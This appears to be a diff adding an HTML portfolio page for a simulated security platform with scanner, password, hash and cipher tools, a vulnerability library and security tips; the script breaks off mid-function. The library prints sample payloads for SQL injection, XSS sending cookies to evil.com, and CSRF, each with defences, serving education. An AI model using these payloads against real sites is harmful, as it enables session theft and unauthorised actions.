@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CyberShield — Security Intelligence Platform</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg:#0A0F1E; --bg2:#0D1B3E; --card:#111827; --border:#1e3a5f;
+  --blue:#2563EB; --blue2:#1d4ed8; --cyan:#06B6D4; --green:#10B981;
+  --red:#EF4444; --yellow:#F59E0B; --body:#94A3B8; --head:#F1F5F9;
+  --mono:'JetBrains Mono',monospace;
+}
+html { scroll-behavior: smooth; }
+body { background:var(--bg); color:var(--body); font-family:'Inter',sans-serif; font-size:15px; line-height:1.7; overflow-x:hidden; }
+h1,h2,h3,h4 { font-family:'Space Grotesk',sans-serif; color:var(--head); line-height:1.2; }
+a { color:var(--cyan); text-decoration:none; }
+
+/* ── TOP NAV ── */
+nav {
+  position:fixed; top:0; left:0; right:0; z-index:200;
+  height:64px; display:flex; align-items:center; justify-content:space-between;
+  padding:0 2rem;
+  background:rgba(10,15,30,0.92); backdrop-filter:blur(14px);
+  border-bottom:1px solid var(--border);
+}
+.nav-logo {
+  font-family:'Space Grotesk',sans-serif; font-size:1.15rem; font-weight:700;
+  color:var(--head); display:flex; align-items:center; gap:0.45rem; cursor:pointer;
+}
+.nav-logo span { color:var(--cyan); }
+.nav-badge {
+  background:var(--blue); color:#fff; padding:0.35rem 0.9rem; border-radius:6px;
+  font-size:0.82rem; font-weight:600; font-family:'Space Grotesk',sans-serif;
+}
+.hamburger {
+  display:none; flex-direction:column; gap:5px; cursor:pointer; padding:4px;
+}
+.hamburger span { display:block; width:22px; height:2px; background:var(--body); border-radius:2px; transition:all 0.3s; }
+
+/* ── SIDEBAR ── */
+.sidebar {
+  position:fixed; top:64px; left:0; bottom:0; width:230px; z-index:150;
+  background:var(--bg2); border-right:1px solid var(--border);
+  display:flex; flex-direction:column; padding:1.5rem 0;
+  transition:transform 0.3s;
+}
+.sidebar-section-label {
+  font-family:var(--mono); font-size:0.68rem; color:var(--body);
+  letter-spacing:0.12em; text-transform:uppercase;
+  padding:0 1.2rem; margin-bottom:0.5rem; margin-top:1rem; opacity:0.6;
+}
+.sidebar-section-label:first-child { margin-top:0; }
+.nav-item {
+  display:flex; align-items:center; gap:0.75rem;
+  padding:0.65rem 1.2rem; cursor:pointer;
+  font-family:'Space Grotesk',sans-serif; font-size:0.88rem; font-weight:500;
+  color:var(--body); border-left:3px solid transparent;
+  transition:all 0.18s;
+}
+.nav-item:hover { color:var(--head); background:rgba(37,99,235,0.08); }
+.nav-item.active { color:var(--cyan); border-left-color:var(--cyan); background:rgba(6,182,212,0.07); }
+.nav-item .icon { font-size:1rem; width:20px; text-align:center; }
+.nav-item .badge-new {
+  margin-left:auto; background:rgba(16,185,129,0.15); color:var(--green);
+  font-size:0.65rem; padding:0.1rem 0.4rem; border-radius:4px; font-family:var(--mono);
+}
+
+/* ── MAIN CONTENT ── */
+.main {
+  margin-left:230px; padding-top:64px; min-height:100vh;
+}
+.page { display:none; }
+.page.active { display:block; }
+
+/* ── HERO (HOME) ── */
+.hero {
+  min-height:calc(100vh - 64px);
+  display:grid; grid-template-columns:1fr 1fr;
+  align-items:center; padding:5rem 5vw 4rem; gap:4rem;
+  position:relative; overflow:hidden;
+}
+.hero::before {
+  content:''; position:absolute; inset:0;
+  background:radial-gradient(ellipse 60% 60% at 70% 50%, rgba(37,99,235,0.12) 0%, transparent 70%);
+  pointer-events:none;
+}
+.hero-eyebrow {
+  display:inline-flex; align-items:center; gap:0.5rem;
+  background:rgba(6,182,212,0.1); border:1px solid rgba(6,182,212,0.3);
+  border-radius:100px; padding:0.3rem 0.9rem;
+  font-size:0.78rem; font-family:var(--mono); color:var(--cyan);
+  margin-bottom:1.5rem; letter-spacing:0.05em;
+}
+.pulse-dot { width:7px; height:7px; border-radius:50%; background:var(--cyan); animation:pdot 1.5s ease-in-out infinite; }
+@keyframes pdot { 0%,100%{opacity:1;transform:scale(1)} 50%{opacity:0.4;transform:scale(0.7)} }
+.hero h1 { font-size:clamp(2rem,3.5vw,3.4rem); font-weight:700; margin-bottom:1.2rem; }
+.hero h1 em { font-style:normal; color:var(--cyan); }
+.hero p { font-size:1rem; max-width:48ch; margin-bottom:2rem; }
+.hero-actions { display:flex; gap:1rem; flex-wrap:wrap; }
+.btn-primary {
+  background:var(--blue); color:#fff; padding:0.7rem 1.6rem; border-radius:8px;
+  font-weight:600; font-family:'Space Grotesk',sans-serif; transition:background 0.2s,transform 0.1s;
+  border:none; cursor:pointer; font-size:0.92rem;
+}
+.btn-primary:hover { background:var(--blue2); transform:translateY(-1px); }
+.btn-ghost {
+  background:transparent; color:var(--head); padding:0.7rem 1.6rem; border-radius:8px;
+  border:1px solid var(--border); cursor:pointer; font-weight:500; font-size:0.92rem;
+  transition:border-color 0.2s,color 0.2s;
+}
+.btn-ghost:hover { border-color:var(--cyan); color:var(--cyan); }
+.radar-wrap { width:300px; height:300px; position:relative; }
+#radarCanvas { width:100%; height:100%; border-radius:50%; border:1px solid rgba(6,182,212,0.2); }
+.radar-label {
+  position:absolute; bottom:-2rem; left:50%; transform:translateX(-50%);
+  font-family:var(--mono); font-size:0.7rem; color:var(--cyan); opacity:0.7; white-space:nowrap; letter-spacing:0.1em;
+}
+
+/* ── STATS ── */
+.stats-bar {
+  display:flex; justify-content:space-around; flex-wrap:wrap;
+  padding:1.6rem 5vw; border-top:1px solid var(--border); border-bottom:1px solid var(--border);
+  background:var(--bg2); gap:1rem;
+}
+.stat { text-align:center; }
+.stat-num { font-family:'Space Grotesk',sans-serif; font-size:1.7rem; font-weight:700; color:var(--cyan); }
+.stat-label { font-size:0.78rem; letter-spacing:0.05em; text-transform:uppercase; opacity:0.7; }
+
+/* ── HOME FEATURE CARDS ── */
+.feature-grid {
+  display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:1.2rem;
+  padding:3rem 5vw 4rem;
+}
+.feature-card {
+  background:var(--card); border:1px solid var(--border); border-radius:12px;
+  padding:1.4rem; cursor:pointer; transition:border-color 0.2s,transform 0.2s;
+  display:flex; flex-direction:column; gap:0.6rem;
+}
+.feature-card:hover { border-color:var(--blue); transform:translateY(-2px); }
+.feature-card .fc-icon { font-size:1.6rem; }
+.feature-card h3 { font-size:0.95rem; }
+.feature-card p { font-size:0.82rem; color:var(--body); flex:1; }
+.feature-card .fc-link {
+  font-family:var(--mono); font-size:0.75rem; color:var(--cyan);
+  display:flex; align-items:center; gap:0.3rem; margin-top:0.4rem;
+}
+
+/* ── COMMUNITY FEED (HOME) ── */
+.home-feed { padding:0 5vw 4rem; }
+.home-feed-inner { display:grid; grid-template-columns:2fr 1fr; gap:2.5rem; align-items:start; }
+.section-eyebrow { font-family:var(--mono); font-size:0.75rem; color:var(--cyan); letter-spacing:0.1em; text-transform:uppercase; margin-bottom:0.5rem; }
+.section-title { font-size:clamp(1.4rem,2.5vw,2rem); font-weight:700; margin-bottom:0.8rem; }
+.section-sub { max-width:60ch; margin-bottom:2rem; }
+.feed-list { display:flex; flex-direction:column; gap:0.8rem; }
+.feed-item {
+  background:var(--card); border:1px solid var(--border); border-radius:10px;
+  padding:1rem 1.2rem; display:flex; gap:0.8rem; align-items:flex-start;
+}
+.feed-badge {
+  flex-shrink:0; padding:0.2rem 0.55rem; border-radius:5px;
+  font-family:var(--mono); font-size:0.68rem; font-weight:500; text-transform:uppercase;
+}
+.feed-badge.malware { background:rgba(239,68,68,0.15); color:var(--red); }
+.feed-badge.phishing { background:rgba(245,158,11,0.15); color:var(--yellow); }
+.feed-badge.ip { background:rgba(37,99,235,0.15); color:#60a5fa; }
+.feed-badge.url { background:rgba(6,182,212,0.15); color:var(--cyan); }
+.feed-info h4 { font-size:0.87rem; margin-bottom:0.15rem; }
+.feed-info p { font-size:0.78rem; font-family:var(--mono); }
+.feed-time { margin-left:auto; font-size:0.73rem; color:var(--body); white-space:nowrap; flex-shrink:0; }
+.submit-report { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; }
+.submit-report h3 { margin-bottom:0.4rem; }
+.submit-report p { font-size:0.83rem; margin-bottom:1.2rem; }
+.success-msg { color:var(--green); font-family:var(--mono); font-size:0.8rem; margin-top:0.6rem; display:none; }
+
+/* ── PAGE INNER ── */
+.page-inner { padding:3.5rem 5vw 5rem; }
+.page-header { margin-bottom:2.5rem; padding-bottom:1.5rem; border-bottom:1px solid var(--border); }
+.page-header .section-eyebrow { margin-bottom:0.4rem; }
+.page-header h2 { font-size:clamp(1.6rem,3vw,2.2rem); margin-bottom:0.5rem; }
+.page-header p { max-width:60ch; font-size:0.95rem; }
+
+/* ── INPUTS ── */
+input[type="text"],input[type="url"],textarea,select {
+  width:100%; background:var(--bg2); border:1px solid var(--border);
+  color:var(--head); border-radius:8px; padding:0.65rem 1rem;
+  font-family:var(--mono); font-size:0.88rem; outline:none;
+  transition:border-color 0.2s; margin-bottom:0.8rem;
+}
+input:focus,textarea:focus,select:focus { border-color:var(--cyan); }
+textarea { resize:vertical; min-height:90px; }
+select { appearance:none; cursor:pointer; }
+.tool-card {
+  background:var(--card); border:1px solid var(--border);
+  border-radius:12px; padding:2rem; max-width:720px;
+}
+.tool-card h3 { margin-bottom:0.4rem; }
+.tool-card > p { font-size:0.88rem; margin-bottom:1.4rem; }
+.tool-result {
+  background:var(--bg); border:1px solid var(--border); border-radius:8px;
+  padding:1rem 1.2rem; font-family:var(--mono); font-size:0.84rem;
+  color:var(--cyan); min-height:48px; word-break:break-all; white-space:pre-wrap; margin-top:0.8rem;
+}
+.strength-bar { height:6px; border-radius:3px; background:var(--border); margin:0.8rem 0 0.4rem; overflow:hidden; }
+.strength-fill { height:100%; border-radius:3px; transition:width 0.4s,background 0.4s; width:0; }
+.strength-label { font-family:var(--mono); font-size:0.8rem; }
+.row-2 { display:flex; gap:0.8rem; }
+.row-2 input { margin-bottom:0; }
+.loading-text { font-family:var(--mono); font-size:0.85rem; color:var(--cyan); display:none; }
+
+/* ── SCAN RESULT ── */
+.scan-result { background:var(--bg); border:1px solid var(--border); border-radius:10px; padding:1.2rem 1.5rem; margin-top:1rem; }
+.scan-status { display:inline-flex; align-items:center; gap:0.5rem; font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:0.95rem; margin-bottom:0.8rem; }
+.scan-status.clean { color:var(--green); }
+.scan-status.threat { color:var(--red); }
+.scan-status.warn { color:var(--yellow); }
+.scan-meta { font-family:var(--mono); font-size:0.8rem; color:var(--body); }
+.scan-meta span { color:var(--head); }
+.scan-share { margin-top:1rem; padding-top:1rem; border-top:1px solid var(--border); font-size:0.82rem; color:var(--body); }
+.scan-share strong { color:var(--cyan); }
+
+/* ── VULN CARDS ── */
+.vuln-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(300px,1fr)); gap:1.4rem; }
+.vuln-card {
+  background:var(--card); border:1px solid var(--border); border-radius:12px;
+  padding:1.4rem; cursor:pointer; transition:border-color 0.2s,transform 0.2s;
+  position:relative; overflow:hidden;
+}
+.vuln-card:hover { border-color:var(--blue); transform:translateY(-2px); }
+.vuln-card::before { content:''; position:absolute; top:0; left:0; right:0; height:3px; }
+.vuln-card.critical::before { background:var(--red); }
+.vuln-card.high::before { background:var(--yellow); }
+.vuln-card.medium::before { background:var(--cyan); }
+.vuln-severity {
+  font-family:var(--mono); font-size:0.68rem; letter-spacing:0.1em; text-transform:uppercase;
+  padding:0.18rem 0.55rem; border-radius:4px; margin-bottom:0.7rem; display:inline-block;
+}
+.critical .vuln-severity { background:rgba(239,68,68,0.15); color:var(--red); }
+.high .vuln-severity { background:rgba(245,158,11,0.15); color:var(--yellow); }
+.medium .vuln-severity { background:rgba(6,182,212,0.15); color:var(--cyan); }
+.vuln-card h3 { font-size:0.97rem; margin-bottom:0.45rem; }
+.vuln-card > p { font-size:0.83rem; margin-bottom:0.8rem; }
+.vuln-detail { display:none; font-size:0.82rem; border-top:1px solid var(--border); padding-top:0.9rem; }
+.vuln-detail.open { display:block; }
+.vuln-detail code {
+  display:block; background:var(--bg); padding:0.7rem; border-radius:6px;
+  font-family:var(--mono); font-size:0.76rem; color:var(--yellow);
+  margin:0.4rem 0; overflow-x:auto; white-space:pre;
+}
+
+/* ── TIPS ── */
+.tips-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(260px,1fr)); gap:1.3rem; }
+.tip-card { background:var(--card); border:1px solid var(--border); border-radius:12px; padding:1.4rem; }
+.tip-icon { font-size:1.7rem; margin-bottom:0.7rem; }
+.tip-card h3 { font-size:0.92rem; margin-bottom:0.4rem; }
+.tip-card p { font-size:0.83rem; }
+
+/* ── FOOTER ── */
+footer { text-align:center; padding:2rem; border-top:1px solid var(--border); font-size:0.8rem; color:var(--body); }
+footer strong { color:var(--cyan); }
+
+/* ── UTIL ── */
+.hidden { display:none !important; }
+.mt08 { margin-top:0.8rem; }
+
+/* ── MOBILE ── */
+@media(max-width:860px){
+  .sidebar { transform:translateX(-100%); }
+  .sidebar.open { transform:translateX(0); }
+  .main { margin-left:0; }
+  .hamburger { display:flex; }
+  .hero { grid-template-columns:1fr; }
+  .hero-radar { display:none; }
+  .home-feed-inner { grid-template-columns:1fr; }
+  .sidebar-overlay { display:block; }
+}
+.sidebar-overlay {
+  display:none; position:fixed; inset:0; z-index:140;
+  background:rgba(0,0,0,0.5); backdrop-filter:blur(2px);
+}
+</style>
+</head>
+<body>
+
+<!-- TOP NAV -->
+<nav>
+  <div class="nav-logo" onclick="navigate('home')">🛡 <span>Cyber</span>Shield</div>
+  <div class="hamburger" onclick="toggleSidebar()" id="ham">
+    <span></span><span></span><span></span>
+  </div>
+  <div class="nav-badge">Live Intelligence</div>
+</nav>
+
+<!-- SIDEBAR OVERLAY -->
+<div class="sidebar-overlay" id="overlay" onclick="toggleSidebar()"></div>
+
+<!-- SIDEBAR -->
+<aside class="sidebar" id="sidebar">
+  <div class="sidebar-section-label">Navigation</div>
+  <div class="nav-item active" data-page="home" onclick="navigate('home')">
+    <span class="icon">🏠</span> Home
+  </div>
+
+  <div class="sidebar-section-label">Security Tools</div>
+  <div class="nav-item" data-page="scanner" onclick="navigate('scanner')">
+    <span class="icon">🔍</span> Threat Scanner <span class="badge-new">Live</span>
+  </div>
+  <div class="nav-item" data-page="password" onclick="navigate('password')">
+    <span class="icon">🔐</span> Password Checker
+  </div>
+  <div class="nav-item" data-page="hash" onclick="navigate('hash')">
+    <span class="icon">🔗</span> Hash Generator
+  </div>
+  <div class="nav-item" data-page="cipher" onclick="navigate('cipher')">
+    <span class="icon">🔄</span> Cipher Tool
+  </div>
+
+  <div class="sidebar-section-label">Knowledge Base</div>
+  <div class="nav-item" data-page="vulnerabilities" onclick="navigate('vulnerabilities')">
+    <span class="icon">⚠️</span> Vulnerabilities
+  </div>
+  <div class="nav-item" data-page="tips" onclick="navigate('tips')">
+    <span class="icon">🛡</span> Best Practices
+  </div>
+</aside>
+
+<!-- MAIN -->
+<div class="main">
+
+  <!-- ══ HOME PAGE ══ -->
+  <div class="page active" id="page-home">
+    <div class="hero">
+      <div class="hero-text">
+        <div class="hero-eyebrow"><span class="pulse-dot"></span> Real-time Threat Intelligence</div>
+        <h1>Defend Against<br><em>Every Threat</em><br>Before It Strikes</h1>
+        <p>Scan suspicious files, domains, IPs, and URLs. Detect malware and breaches in seconds — and share threat intelligence with the global security community.</p>
+        <div class="hero-actions">
+          <button class="btn-primary" onclick="navigate('scanner')">Start Scanning</button>
+          <button class="btn-ghost" onclick="navigate('vulnerabilities')">Explore Threats</button>
+        </div>
+      </div>
+      <div class="hero-radar" style="display:flex;justify-content:center;align-items:center;">
+        <div class="radar-wrap">
+          <canvas id="radarCanvas" width="300" height="300"></canvas>
+          <div class="radar-label">THREAT RADAR — LIVE SWEEP</div>
+        </div>
+      </div>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats-bar">
+      <div class="stat"><div class="stat-num" id="s1">0</div><div class="stat-label">Threats Detected Today</div></div>
+      <div class="stat"><div class="stat-num" id="s2">0</div><div class="stat-label">Files Scanned</div></div>
+      <div class="stat"><div class="stat-num" id="s3">0</div><div class="stat-label">IPs Flagged</div></div>
+      <div class="stat"><div class="stat-num" id="s4">0</div><div class="stat-label">Community Reports</div></div>
+    </div>
+
+    <!-- FEATURE CARDS -->
+    <div style="padding:3rem 5vw 1rem">
+      <div class="section-eyebrow">// platform_features</div>
+      <div class="section-title">What You Can Do</div>
+    </div>
+    <div class="feature-grid">
+      <div class="feature-card" onclick="navigate('scanner')">
+        <div class="fc-icon">🔍</div>
+        <h3>Threat Scanner</h3>
+        <p>Analyse URLs, IPs, domains, and file hashes against threat intelligence databases in real time.</p>
+        <div class="fc-link">Open Scanner →</div>
+      </div>
+      <div class="feature-card" onclick="navigate('password')">
+        <div class="fc-icon">🔐</div>
+        <h3>Password Checker</h3>
+        <p>Evaluate password strength instantly against entropy, length, and complexity criteria.</p>
+        <div class="fc-link">Check Password →</div>
+      </div>
+      <div class="feature-card" onclick="navigate('hash')">
+        <div class="fc-icon">🔗</div>
+        <h3>Hash Generator</h3>
+        <p>Generate cryptographic hashes (SHA-256, SHA-1, SHA-512) directly in your browser.</p>
+        <div class="fc-link">Generate Hash →</div>
+      </div>
+      <div class="feature-card" onclick="navigate('cipher')">
+        <div class="fc-icon">🔄</div>
+        <h3>Cipher Tool</h3>
+        <p>Encode and decode text using Caesar, ROT-13, Atbash, and Base64 ciphers.</p>
+        <div class="fc-link">Open Cipher →</div>
+      </div>
+      <div class="feature-card" onclick="navigate('vulnerabilities')">
+        <div class="fc-icon">⚠️</div>
+        <h3>Vulnerability Library</h3>
+        <p>Learn how the most critical vulnerabilities work — with code examples and defences.</p>
+        <div class="fc-link">Explore →</div>
+      </div>
+      <div class="feature-card" onclick="navigate('tips')">
+        <div class="fc-icon">🛡</div>
+        <h3>Best Practices</h3>
+        <p>Actionable security tips covering MFA, backups, encryption, and attack surface reduction.</p>
+        <div class="fc-link">Read Tips →</div>
+      </div>
+    </div>
+
+    <!-- LIVE FEED -->
+    <div class="home-feed">
+      <div class="section-eyebrow">// community_intelligence</div>
+      <div class="section-title">Live Threat Feed</div>
+      <p class="section-sub">Threats detected and submitted by the CyberShield community. All submissions are verified before being shared.</p>
+      <div class="home-feed-inner">
+        <div class="feed-list" id="feed-list"></div>
+        <div class="submit-report">
+          <h3>Submit a Threat</h3>
+          <p>Spotted something suspicious? Report it to protect the community.</p>
+          <select id="report-type"><option value="url">URL</option><option value="ip">IP Address</option><option value="domain">Domain</option><option value="file">File Hash</option></select>
+          <input type="text" id="report-value" placeholder="e.g. 192.168.1.100" />
+          <input type="text" id="report-desc" placeholder="Brief description (optional)" />
+          <button class="btn-primary" style="width:100%" onclick="submitReport()">Share with Community</button>
+          <div class="success-msg" id="report-success">✓ Report submitted. Thank you for keeping the community safe.</div>
+        </div>
+      </div>
+    </div>
+
+    <footer>Built as a cybersecurity portfolio project — powered by <strong>CyberShield Intelligence Platform</strong>.<br>This is a demonstration project. Scans are simulated for portfolio purposes.</footer>
+  </div>
+
+  <!-- ══ THREAT SCANNER PAGE ══ -->
+  <div class="page" id="page-scanner">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// threat_scanner</div>
+        <h2>Threat Scanner</h2>
+        <p>Analyse suspicious files, domains, IPs, and URLs for malware and security threats. Flagged indicators are automatically shared with the security community.</p>
+      </div>
+      <div class="tool-card" style="max-width:780px">
+        <h3>Submit an Indicator for Analysis</h3>
+        <p>Select the type of indicator you want to scan, then enter its value below.</p>
+        <select id="scan-type" onchange="clearScan()">
+          <option value="url">🌐 URL</option>
+          <option value="ip">📡 IP Address</option>
+          <option value="domain">🌍 Domain</option>
+          <option value="file">📄 File Hash (MD5 / SHA256)</option>
+        </select>
+        <input type="text" id="scan-input" placeholder="e.g. https://suspicious-site.example.com" />
+        <button class="btn-primary" onclick="runScan()">Analyse Now</button>
+        <div class="loading-text mt08" id="scan-loading">⟳ Querying threat intelligence databases…</div>
+        <div id="scan-output" class="hidden"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ PASSWORD PAGE ══ -->
+  <div class="page" id="page-password">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// password_checker</div>
+        <h2>Password Strength Checker</h2>
+        <p>Instantly evaluate how secure your password is based on length, complexity, and common patterns. Nothing you type is sent anywhere.</p>
+      </div>
+      <div class="tool-card">
+        <h3>Check Your Password</h3>
+        <p>Type a password below to see a real-time strength analysis.</p>
+        <input type="text" id="pw-input" placeholder="Type a password to analyse…" oninput="checkPassword(this.value)" autocomplete="off" />
+        <div class="strength-bar"><div class="strength-fill" id="pw-fill"></div></div>
+        <div class="strength-label" id="pw-label">—</div>
+        <div class="tool-result" id="pw-result">Enter a password above to see analysis.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ HASH PAGE ══ -->
+  <div class="page" id="page-hash">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// hash_generator</div>
+        <h2>Hash Generator</h2>
+        <p>Generate cryptographic hashes for any text input using industry-standard algorithms. All computation happens locally in your browser.</p>
+      </div>
+      <div class="tool-card">
+        <h3>Generate a Hash</h3>
+        <p>Enter your text and choose an algorithm — the hash is computed instantly.</p>
+        <textarea id="hash-input" placeholder="Enter text to hash…"></textarea>
+        <select id="hash-algo">
+          <option value="SHA-256">SHA-256</option>
+          <option value="SHA-1">SHA-1</option>
+          <option value="SHA-512">SHA-512</option>
+        </select>
+        <button class="btn-primary" onclick="generateHash()">Generate Hash</button>
+        <div class="tool-result" id="hash-result">—</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ CIPHER PAGE ══ -->
+  <div class="page" id="page-cipher">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// cipher_tool</div>
+        <h2>Cipher Encoder / Decoder</h2>
+        <p>Encode or decode text using classical ciphers commonly referenced in CTF challenges and security education.</p>
+      </div>
+      <div class="tool-card">
+        <h3>Encode or Decode Text</h3>
+        <p>Enter your message, select a cipher, then choose to encode or decode.</p>
+        <textarea id="cipher-input" placeholder="Enter text…"></textarea>
+        <div class="row-2">
+          <select id="cipher-type">
+            <option value="caesar">Caesar Cipher</option>
+            <option value="rot13">ROT-13</option>
+            <option value="atbash">Atbash</option>
+            <option value="base64">Base64</option>
+          </select>
+          <input type="text" id="cipher-shift" placeholder="Shift (1–25, Caesar only)" style="margin-bottom:0" />
+        </div>
+        <div style="display:flex;gap:0.6rem;margin-top:0.8rem">
+          <button class="btn-primary" onclick="runCipher('encode')">Encode</button>
+          <button class="btn-ghost" onclick="runCipher('decode')">Decode</button>
+        </div>
+        <div class="tool-result" id="cipher-result">—</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ VULNERABILITIES PAGE ══ -->
+  <div class="page" id="page-vulnerabilities">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// vulnerability_library</div>
+        <h2>Vulnerability Library</h2>
+        <p>Learn how the most dangerous vulnerabilities work and how to defend against them. Click any card to expand details.</p>
+      </div>
+      <div class="vuln-grid">
+        <div class="vuln-card critical" onclick="toggleVuln(this)">
+          <div class="vuln-severity">Critical</div>
+          <h3>SQL Injection</h3>
+          <p>Attackers inject malicious SQL into input fields to manipulate database queries.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> User input is passed directly into a SQL query without sanitisation.</p>
+            <code>' OR '1'='1'; --</code>
+            <p><strong>Defence:</strong> Use parameterised queries, prepared statements, and an ORM. Never concatenate raw input into SQL strings.</p>
+          </div>
+        </div>
+        <div class="vuln-card critical" onclick="toggleVuln(this)">
+          <div class="vuln-severity">Critical</div>
+          <h3>Cross-Site Scripting (XSS)</h3>
+          <p>Injecting malicious scripts into web pages viewed by other users.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> Unsanitised user input is rendered as HTML/JS in the browser.</p>
+            <code>&lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;</code>
+            <p><strong>Defence:</strong> Encode output, implement a strict Content Security Policy (CSP), and use modern frameworks that auto-escape.</p>
+          </div>
+        </div>
+        <div class="vuln-card high" onclick="toggleVuln(this)">
+          <div class="vuln-severity">High</div>
+          <h3>Cross-Site Request Forgery</h3>
+          <p>Tricking authenticated users into unknowingly sending malicious requests.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> The attacker crafts a request that uses the victim's active session credentials.</p>
+            <code>&lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;</code>
+            <p><strong>Defence:</strong> Use anti-CSRF tokens, SameSite cookies, and verify the Origin/Referer headers.</p>
+          </div>
+        </div>
+        <div class="vuln-card high" onclick="toggleVuln(this)">
+          <div class="vuln-severity">High</div>
+          <h3>Broken Authentication</h3>
+          <p>Weak session management, credential stuffing, and insecure login flows.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> Attackers exploit weak passwords, leaked credentials, or session tokens to take over accounts.</p>
+            <p><strong>Defence:</strong> Enforce MFA, rate-limit login attempts, use secure session tokens, and hash passwords with bcrypt/Argon2.</p>
+          </div>
+        </div>
+        <div class="vuln-card medium" onclick="toggleVuln(this)">
+          <div class="vuln-severity">Medium</div>
+          <h3>Sensitive Data Exposure</h3>
+          <p>Unencrypted transmission or storage of sensitive data like passwords and PII.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> Data is sent over HTTP, stored in plaintext logs, or cached in browsers without protection.</p>
+            <p><strong>Defence:</strong> Enforce HTTPS everywhere, encrypt data at rest, and avoid logging sensitive fields.</p>
+          </div>
+        </div>
+        <div class="vuln-card medium" onclick="toggleVuln(this)">
+          <div class="vuln-severity">Medium</div>
+          <h3>Security Misconfiguration</h3>
+          <p>Default credentials, open cloud buckets, and verbose error messages.</p>
+          <div class="vuln-detail">
+            <p><strong>How it works:</strong> Systems left with default settings expose unnecessary attack surface — admin panels, debug endpoints, or public S3 buckets.</p>
+            <p><strong>Defence:</strong> Harden configurations, disable default accounts, restrict access, and run automated config audits.</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══ TIPS PAGE ══ -->
+  <div class="page" id="page-tips">
+    <div class="page-inner">
+      <div class="page-header">
+        <div class="section-eyebrow">// best_practices</div>
+        <h2>Security Best Practices</h2>
+        <p>Actionable steps to strengthen your security posture at every layer.</p>
+      </div>
+      <div class="tips-grid">
+        <div class="tip-card"><div class="tip-icon">🔑</div><h3>Use a Password Manager</h3><p>Generate and store unique, complex passwords for every account. Never reuse passwords across services.</p></div>
+        <div class="tip-card"><div class="tip-icon">📱</div><h3>Enable Multi-Factor Authentication</h3><p>MFA blocks 99.9% of automated account-takeover attacks. Use an authenticator app, not SMS where avoidable.</p></div>
+        <div class="tip-card"><div class="tip-icon">🔄</div><h3>Keep Software Updated</h3><p>Unpatched software is the leading attack vector. Enable automatic updates for your OS, browser, and apps.</p></div>
+        <div class="tip-card"><div class="tip-icon">🕵️</div><h3>Verify Before You Click</h3><p>Hover over links before clicking. Check sender addresses carefully. Legitimate services never ask for credentials via email.</p></div>
+        <div class="tip-card"><div class="tip-icon">🌐</div><h3>Use a VPN on Public Wi-Fi</h3><p>Public networks are hunting grounds for attackers. A VPN encrypts your traffic and hides your identity.</p></div>
+        <div class="tip-card"><div class="tip-icon">💾</div><h3>Back Up Your Data</h3><p>Follow the 3-2-1 rule: 3 copies, 2 different media types, 1 off-site. Your backup is your last line of defence against ransomware.</p></div>
+        <div class="tip-card"><div class="tip-icon">🔒</div><h3>Encrypt Sensitive Files</h3><p>Use tools like VeraCrypt or BitLocker to encrypt drives. If a device is stolen, encrypted data stays protected.</p></div>
+        <div class="tip-card"><div class="tip-icon">🧹</div><h3>Minimise Your Attack Surface</h3><p>Disable unused services, close open ports, and remove software you no longer need. Less exposure = less risk.</p></div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- /main -->
+
+<script>
+// ── NAVIGATION ────────────────────────────────────────────────────
+function navigate(page) {
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+  document.getElementById('page-'+page).classList.add('active');
+  const ni = document.querySelector(`.nav-item[data-page="${page}"]`);
+  if(ni) ni.classList.add('active');
+  window.scrollTo(0,0);
+  // close sidebar on mobile
+  document.getElementById('sidebar').classList.remove('open');
+  document.getElementById('overlay').style.display='none';
+}
+
+function toggleSidebar() {
+  const sb = document.getElementById('sidebar');
+  const ov = document.getElementById('overlay');
+  const isOpen = sb.classList.toggle('open');
+  ov.style.display = isOpen ? 'block' : 'none';
+}
+
+// ── RADAR ─────────────────────────────────────────────────────────
+const canvas = document.getElementById('radarCanvas');
+const ctx = canvas.getContext('2d');
+const W=300,H=300,cx=W/2,cy=H/2,R=130;
+let angle=0;
+const blips=Array.from({length:8},()=>({a:Math.random()*Math.PI*2,r:Math.random()*R*0.85,life:0,maxLife:120+Math.random()*80}));
+function drawRadar(){
+  ctx.clearRect(0,0,W,H);
+  [0.25,0.5,0.75,1].forEach(f=>{
+    ctx.beginPath(); ctx.arc(cx,cy,R*f,0,Math.PI*2);
+    ctx.strokeStyle=`rgba(6,182,212,${f===1?0.3:0.12})`; ctx.lineWidth=1; ctx.stroke();
+  });
+  ctx.strokeStyle='rgba(6,182,212,0.08)'; ctx.lineWidth=1;
